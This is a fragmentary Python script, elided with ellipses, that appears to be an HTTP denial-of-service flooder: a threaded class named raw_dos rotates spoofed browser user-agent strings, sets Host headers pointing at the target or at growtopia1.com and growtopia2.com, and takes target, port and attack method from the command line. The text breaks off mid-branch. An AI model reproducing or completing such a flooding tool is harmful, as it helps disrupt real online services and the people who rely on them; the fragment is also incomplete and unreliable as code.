...
import threading, random, re, requests, urllib3
...
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",                                                                                              "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
...
class raw_dos(threading.Thread):
    ...
    def run(self):
        ...
        headersx={"Host" : random.choice([sys.argv[1], "growtopia1.com", "growtopia2.com"]),
        ...
        url = sys.argv[1]+":"+str(sys.argv[2])
        method_attack = str(sys.argv[3])
        if method_attack == "1":
